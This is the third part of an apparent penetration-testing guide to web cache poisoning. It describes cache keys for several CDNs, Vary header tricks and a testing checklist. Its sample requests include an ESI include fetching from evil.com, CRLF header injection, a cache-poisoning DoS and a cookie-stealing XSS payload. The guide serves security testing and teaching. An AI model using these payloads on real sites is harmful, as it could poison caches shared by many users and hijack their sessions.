# cache-poisoning-test · part 3

> 分段 3/3。完整索引见 `cache-poisoning-test.md`。

## 6. CDN-SPECIFIC BEHAVIOR

### 6.1 Cloudflare

```
### Cache status header: cf-cache-status
### Values: HIT, MISS, EXPIRED, DYNAMIC, BYPASS

### Default caching: by file extension (.js, .css, .png, etc.)
### Query strings: included in cache key by default
### Headers in key: Host only

### Page Rules: can force cache of HTML / API responses
### Cache-Control respected: yes

### Bypass methods:
### - Set Cache-Control: no-cache on origin
### - Use __cf_chl_jschl_tk__ (Cloudflare challenge token) — not in key

### Interesting behaviors:
### - Cloudflare Workers can modify cache key
### - cf-connecting-ip header added (unkeyed, may be reflected)
### - True-Client-IP header (unkeyed on some plans)
```

### 6.2 AWS CloudFront

```
### Cache status header: x-cache (Hit from cloudfront / Miss from cloudfront)
### Also: x-amz-cf-id, x-amz-cf-pop

### Default cache key: Host + URI path + query string
### Query strings: can be configured (all, none, whitelist)
### Headers in key: configurable via Cache Policy (Host, Accept, etc.)
### Cookies in key: configurable (all, none, whitelist)

### Gotchas:
### - Default: query strings NOT in cache key (must configure)
### - Default: cookies NOT in cache key
### - Can whitelist specific headers/cookies into key

### Poisoning opportunity:
### If query strings excluded → append reflected param → poison
### If X-Forwarded-Host not in key but reflected → classic poisoning
```

### 6.3 Akamai

```
### Cache status header: X-Cache (TCP_HIT, TCP_MISS)
### Also: X-Akamai-Request-ID

### Cache key (default): Host + path + query (configurable)
### "Cache ID Modification" feature: custom key composition
### "Remove Vary Header" feature: strips Vary

### Interesting behaviors:
### - Pragma: akamai-x-cache-on (enable cache debug)
### - Pragma: akamai-x-get-cache-key (reveal cache key)
### - Akamai-Transform header (can affect response)
### - True-Client-IP (unkeyed, may be reflected)

### Revealing cache key (if debug enabled):
curl -H "Pragma: akamai-x-get-cache-key" https://target.com/ -v
```

### 6.4 Varnish

```
### Cache status header: X-Varnish (two IDs = HIT, one ID = MISS)
### Also: Age, Via (varnish)

### Default cache key: req.url (path + query)
### VCL customization: hash_data() in vcl_hash
### Default: does NOT cache requests with Cookie header

### Interesting behaviors:
### - obj.hits indicates number of cache hits
### - X-Varnish-Cache header (custom)
### - Builtin: strips If-Modified-Since on cache hit

### VCL key inspection:
### If you have access to VCL config, look at vcl_hash for key composition
### sub vcl_hash {
###   hash_data(req.url);
###   hash_data(req.http.host);
### }
```

### 6.5 Fastly

```
### Cache status header: X-Cache (HIT, MISS)
### Also: X-Served-By, X-Cache-Hits, X-Timer

### Fastly uses Varnish under the hood
### VCL-based configuration
### Default cache key: URL + Host
### Surrogate-Control header: overrides Cache-Control for CDN
### Fastly-Debug: 1 (if enabled → reveals cache details)

### Interesting behaviors:
### - Surrogate-Key header for purge targeting
### - stale-while-revalidate support
### - ESI (Edge Side Includes) support — can be attack vector
```

### 6.6 CDN Cache Key Comparison

| CDN | Default Cache Key Components | Query String Default | Cookie Default |
|---|---|---|---|
| Cloudflare | Host + path + query | Included | Excluded |
| CloudFront | Host + path (query configurable) | Excluded by default | Excluded |
| Akamai | Host + path + query | Included | Excluded |
| Varnish | URL (path + query) | Included | Excluded (no cache with Cookie) |
| Fastly | Host + URL | Included | Excluded |
| Nginx (proxy_cache) | `$scheme$proxy_host$request_uri` | Included | Excluded |

---
## 7. VARY HEADER MANIPULATION

### 7.1 How Vary Works

The `Vary` header tells caches which request headers affect the response. Cache must store separate entries for different values of Vary'd headers.

```http
HTTP/1.1 200 OK
Vary: Accept-Encoding, Accept-Language
```

This means: cache must key on `Accept-Encoding` AND `Accept-Language` values.

### 7.2 Cache Partitioning Attack

If `Vary` doesn't include a header that the application uses to generate different content:

```http
### Application returns different content based on User-Agent:
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (mobile)
→ Returns mobile version

GET / HTTP/1.1  
User-Agent: Mozilla/5.0 (desktop)
→ Returns desktop version

### If Vary does NOT include User-Agent:
### Cache stores one response for all User-Agent values
### Attacker can poison mobile users with desktop content (or vice versa)
```

### 7.3 Vary Header Injection

If attacker can influence the Vary header value:

```http
### Application sets Vary based on request:
Vary: Accept-Encoding, X-Custom-Header

### If attacker adds X-Custom-Header:
GET / HTTP/1.1
X-Custom-Header: unique-value

### Cache creates new partition for this unique value
### Attacker poisons only this partition
### Then links victim to URL with same X-Custom-Header value
```

### 7.4 Vary: * (Wildcard)

```http
Vary: *
```

Tells cache to never serve cached version. Some caches respect this, others ignore it.

| CDN | Vary: * Behavior |
|---|---|
| Cloudflare | Does not cache |
| CloudFront | Does not cache |
| Varnish | Depends on VCL config |
| Nginx | Does not cache (default) |

### 7.5 Missing Vary as a Vulnerability

```
### Application returns personalized content:
GET /dashboard HTTP/1.1
Cookie: session=USER_A_TOKEN
→ Returns User A's dashboard

### If response lacks Vary: Cookie AND cache stores it:
### → User B requests /dashboard → gets User A's cached dashboard
### This IS cache deception (without the victim needing to visit a crafted URL)
```

---
## 8. ADVANCED TECHNIQUES

### 8.1 Cache Poisoning via Error Pages

```http
### Trigger a 404 with injected content:
GET /nonexistent%0D%0AX-Injected:%20yes HTTP/1.1
Host: target.com

### If 404 page reflects the requested path and is cached:
### All users requesting this path get the injected error page
```

### 8.2 Edge Side Includes (ESI) Injection

```http
### If CDN supports ESI and reflects unkeyed input:
GET / HTTP/1.1
X-Forwarded-Host: evil.com

Response:
<esi:include src="http://evil.com/xss.html"/>

### ESI is processed by the cache/CDN → fetches and includes evil content
```

### 8.3 Poisoning via Response Header Injection

```http
### If unkeyed header is reflected in response headers:
GET / HTTP/1.1
X-Custom: value\r\nSet-Cookie: admin=true

### Response:
X-Custom: value
Set-Cookie: admin=true

### Cached → all users get the injected Set-Cookie
```

### 8.4 Web Cache Poisoning DoS

```http
### Poison response to return 403/500/redirect:
GET / HTTP/1.1
X-Forwarded-Host: thisdoesnotexist.com

### If origin tries to load resources from thisdoesnotexist.com:
### Response has broken resources → cached → DoS for all users
```

### 8.5 Chaining Cache Poisoning + XSS

```http
### Step 1: Find unkeyed header reflected in HTML
GET /page HTTP/1.1
X-Forwarded-Host: "><script>alert(document.cookie)</script>.com

### Step 2: Response (if reflected unsanitized):
<link rel="canonical" href="https://"><script>alert(document.cookie)</script>.com/page">

### Step 3: Cache stores this response
### Step 4: All users visiting /page execute attacker's JavaScript
```

---
## 9. TESTING CHECKLIST

```
□ Identify cache layer and CDN product
  - Check: X-Cache, cf-cache-status, Age, Via, X-Varnish, X-Served-By
□ Determine cache key composition
  - Test: adding query params, headers, cookies — does cache key change?
□ Discover unkeyed inputs
  - Headers: X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL, True-Client-IP
  - Parameters: utm_*, fbclid, gclid, callback, jsonp
  - Body: GET request with body parameters
□ Check reflection of unkeyed inputs
  - In HTML body, JavaScript, response headers, redirect Location
□ Verify caching of poisoned response
  - X-Cache: HIT on follow-up clean request
  - Response still contains poison → confirmed
□ Test parameter cloaking
  - Semicolon separator differences
  - Duplicate parameter handling
□ Check Vary header
  - Missing Vary: Cookie on personalized content?
  - Can influence Vary header value?
□ CDN-specific tests
  - ESI support?
  - Debug headers enabled?
  - Cache key reveal features?
□ Impact assessment
  - Stored XSS via cache poisoning?
  - Account takeover via session fixation?
  - DoS via broken resources?
```
